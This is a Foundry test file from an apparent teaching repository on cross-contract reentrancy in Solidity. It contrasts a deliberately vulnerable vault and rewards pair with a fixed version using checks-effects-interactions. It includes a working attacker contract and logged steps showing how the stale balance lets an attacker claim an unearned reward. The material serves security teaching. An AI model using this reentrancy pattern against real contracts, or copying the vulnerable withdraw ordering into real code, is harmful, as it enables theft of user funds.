// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../../../../src/vulnerabilities/reentrancy/cross-contract/SpireVault.sol";
import "../../../../src/vulnerabilities/reentrancy/cross-contract/MirageRewards.sol";
import "../../../../src/vulnerabilities/reentrancy/cross-contract/PhantomAttacker.sol";
import "../../../../src/vulnerabilities/reentrancy/cross-contract/solution/ShieldedSpire.sol";

contract ReentrancyCrossContractTest is Test {

    SpireVault public spireVault;
    MirageRewards public mirageRewards;

    ShieldedSpire public shieldedSpire;
    ShieldedRewards public shieldedRewards;

    address public victim = makeAddr("victim");
    address public attacker = makeAddr("attacker");

    function setUp() public {
        // Deploy vulnerable contracts
        spireVault = new SpireVault();
        mirageRewards = new MirageRewards(address(spireVault));

        // Deploy fixed contracts
        shieldedSpire = new ShieldedSpire();
        shieldedRewards = new ShieldedRewards(address(shieldedSpire));

        // Fund victim
        vm.deal(victim, 10 ether);
        vm.deal(attacker, 1 ether);

        // Fund reward contracts so they can pay out
        vm.deal(address(mirageRewards), 1 ether);
        vm.deal(address(shieldedRewards), 1 ether);

        // Victim deposits into both vaults
        vm.prank(victim);
        spireVault.deposit{value: 5 ether}();

        vm.prank(victim);
        shieldedSpire.deposit{value: 5 ether}();

        console.log("=== SETUP ===");
        console.log("Victim deposited 5 ETH into SpireVault");
        console.log("Victim deposited 5 ETH into ShieldedSpire");
        console.log("MirageRewards funded with 1 ETH for reward payouts");
        console.log("ShieldedRewards funded with 1 ETH for reward payouts");
    }

    // ================================================================
    // VULNERABLE: Cross-contract attack succeeds
    // PhantomAttacker deposits into SpireVault, calls withdraw, and
    // during the callback slips into MirageRewards to claim a reward
    // before SpireVault zeroes the balance --two contracts, one exploit
    // ================================================================
    function test_CrossContractAttackSucceeds() public {
        console.log("");
        console.log("=== CROSS-CONTRACT ATTACK: SpireVault + MirageRewards ===");
        console.log("Step 1: Attacker deploys PhantomAttacker");

        vm.prank(attacker);
        PhantomAttacker phantomAttacker = new PhantomAttacker(
            address(spireVault),
            address(mirageRewards)
        );

        console.log("Step 2: Record balances before the attack");
        console.log("  SpireVault ETH:          ", address(spireVault).balance);
        console.log("  MirageRewards ETH:       ", address(mirageRewards).balance);
        console.log("  Attacker EOA ETH:        ", attacker.balance);

        console.log("Step 3: Attacker calls attack() with 1 ETH");
        console.log("  -> PhantomAttacker deposits 1 ETH into SpireVault");
        console.log("  -> PhantomAttacker calls spireVault.withdraw()");
        console.log("  -> SpireVault sends 1 ETH BEFORE zeroing balance (vulnerable!)");
        console.log("  -> receive() fires: balance is still 1 ETH in SpireVault (stale)");
        console.log("  -> Phantom slips into MirageRewards.claimReward()");
        console.log("  -> MirageRewards checks spireVault.balances() --still 1 ETH!");
        console.log("  -> MirageRewards pays out 0.1 ETH reward");
        console.log("  -> Back in SpireVault: balance finally zeroed (too late)");

        vm.prank(attacker);
        phantomAttacker.attack{value: 1 ether}();

        // Attacker pulls all funds from the attacker contract
        vm.prank(attacker);
        phantomAttacker.withdraw();

        console.log("Step 4: Check the damage");
        console.log("  Attacker EOA ETH:        ", attacker.balance);
        console.log("  SpireVault ETH:          ", address(spireVault).balance);
        console.log("  MirageRewards ETH:       ", address(mirageRewards).balance);
        console.log("  Reward claimed?          ", mirageRewards.rewardClaimed(address(phantomAttacker)));

        // Attacker started with 1 ETH: got 1 ETH back from withdraw + 0.1 ETH reward
        assertEq(
            attacker.balance,
            1.1 ether,
            "Attacker should have 1.1 ETH (original 1 + 0.1 fraudulent reward)"
        );

        // MirageRewards should have lost 0.1 ETH
        assertEq(
            address(mirageRewards).balance,
            0.9 ether,
            "MirageRewards should have 0.9 ETH after paying fraudulent reward"
        );

        // SpireVault should have the victim's funds intact (attacker withdrew their own)
        assertEq(
            address(spireVault).balance,
            5 ether,
            "SpireVault should still have victim's 5 ETH"
        );

        console.log("");
        console.log("ATTACK SUCCEEDED: Phantom claimed a reward they shouldn't have");
        console.log("  The key: MirageRewards trusts SpireVault's balance as truth");
        console.log("  During withdraw, that balance is stale --a mirage");
        console.log("  The attacker crossed contract boundaries to exploit shared state");
    }

    // ================================================================
    // FIXED: Cross-contract attack fails on ShieldedSpire/ShieldedRewards
    // ShieldedSpire uses CEI --balance is zeroed before the callback
    // When the attacker slips into ShieldedRewards, balance reads as 0
    // ================================================================
    function test_CrossContractAttackFails_Shielded() public {
        console.log("");
        console.log("=== CROSS-CONTRACT ATTACK ATTEMPT: ShieldedSpire + ShieldedRewards ===");

        // Deploy attacker targeting the fixed contracts
        ShieldedPhantomAttacker shieldedAttacker = new ShieldedPhantomAttacker(
            address(shieldedSpire),
            address(shieldedRewards)
        );
        vm.deal(address(shieldedAttacker), 1 ether);

        console.log("Step 1: ShieldedSpire balance before:   ", address(shieldedSpire).balance);
        console.log("        ShieldedRewards balance before:  ", address(shieldedRewards).balance);
        console.log("Step 2: Attacker deposits 1 ETH and tries the same cross-contract attack");
        console.log("  -> withdraw() uses CEI: balance is zeroed BEFORE sending ETH");
        console.log("  -> receive() fires: tries claimReward() on ShieldedRewards");
        console.log("  -> ShieldedRewards checks shieldedSpire.balances() --already 0!");
        console.log("  -> claimReward() reverts: 'No balance'");
        console.log("  -> The whole attack unwinds");

        // Attack should revert --CEI means balance is 0 when callback fires
        vm.expectRevert();
        shieldedAttacker.attack{value: 1 ether}();

        console.log("Step 3: ShieldedSpire balance after:    ", address(shieldedSpire).balance);
        console.log("        ShieldedRewards balance after:   ", address(shieldedRewards).balance);

        // Both vaults unchanged
        assertEq(
            address(shieldedSpire).balance,
            5 ether,
            "ShieldedSpire should still have all 5 ETH"
        );
        assertEq(
            address(shieldedRewards).balance,
            1 ether,
            "ShieldedRewards should still have all 1 ETH"
        );

        console.log("");
        console.log("ATTACK BLOCKED: CEI pattern killed the cross-contract reentrancy");
        console.log("  Balance was zeroed before the external call");
        console.log("  When the phantom crossed into ShieldedRewards, balance read 0");
        console.log("  nonReentrant on both contracts adds defense in depth");
    }

    // ================================================================
    // NORMAL USAGE: Deposits, withdrawals, and reward claims work
    // ================================================================
    function test_NormalWithdraw_SpireVault() public {
        console.log("");
        console.log("=== NORMAL WITHDRAW TEST: SpireVault ===");
        console.log("  Victim ETH before:       ", victim.balance);

        vm.prank(victim);
        spireVault.withdraw();

        console.log("  Victim ETH after:        ", victim.balance);

        assertEq(victim.balance, 5 ether, "Normal withdraw failed");
        console.log("  NORMAL WITHDRAW SUCCEEDED");
    }

    function test_NormalWithdraw_ShieldedSpire() public {
        console.log("");
        console.log("=== NORMAL WITHDRAW TEST: ShieldedSpire ===");
        console.log("  Victim ETH before:       ", victim.balance);

        vm.prank(victim);
        shieldedSpire.withdraw();

        console.log("  Victim ETH after:        ", victim.balance);

        assertEq(victim.balance, 5 ether, "Normal withdraw failed on ShieldedSpire");
        console.log("  NORMAL WITHDRAW SUCCEEDED");
    }

    function test_NormalClaimReward() public {
        console.log("");
        console.log("=== NORMAL REWARD CLAIM TEST: MirageRewards ===");
        console.log("  Victim has 5 ETH deposited in SpireVault --eligible for reward");

        uint256 balanceBefore = victim.balance;
        vm.prank(victim);
        mirageRewards.claimReward();

        console.log("  Victim ETH before claim: ", balanceBefore);
        console.log("  Victim ETH after claim:  ", victim.balance);
        console.log("  Reward claimed:          ", mirageRewards.rewardClaimed(victim));

        assertEq(victim.balance, balanceBefore + 0.1 ether, "Reward claim failed");
        assertTrue(mirageRewards.rewardClaimed(victim), "Reward should be marked as claimed");
        console.log("  NORMAL REWARD CLAIM SUCCEEDED");
    }
}

// Helper attacker contract for testing ShieldedSpire/ShieldedRewards
// Mirrors PhantomAttacker but targets the fixed contracts
contract ShieldedPhantomAttacker {
    ShieldedSpire public shieldedSpire;
    ShieldedRewards public shieldedRewards;

    constructor(address _shieldedSpire, address _shieldedRewards) {
        shieldedSpire = ShieldedSpire(_shieldedSpire);
        shieldedRewards = ShieldedRewards(_shieldedRewards);
    }

    receive() external payable {
        // Only reenter from ShieldedSpire callback, not from reward payment
        if (msg.sender == address(shieldedSpire)) {
            shieldedRewards.claimReward();
        }
    }

    function attack() public payable {
        shieldedSpire.deposit{value: msg.value}();
        shieldedSpire.withdraw();
    }
}
